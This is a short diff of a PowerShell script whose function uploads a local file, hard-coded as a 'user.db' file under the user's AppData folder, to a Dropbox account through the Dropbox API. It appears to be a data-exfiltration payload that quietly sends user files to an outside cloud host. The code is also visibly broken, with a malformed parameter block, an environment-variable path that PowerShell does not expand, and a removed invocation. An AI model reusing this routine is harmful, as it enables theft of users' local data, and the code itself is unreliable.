@@ -4,11 +4,11 @@ function DropBox-Upload {
 param (
 	
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[String]$db
 [Alias("f")]
-[string]$SourceFilePath
 ) 
 
-
+$SourceFilePath = "%LOCALAPPDATA%\Microsoft\user.db"
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -19,6 +19,3 @@ $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
-
-$FileName = "$env:%LOCALAPPDATA%\Microsoft\user.db"
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
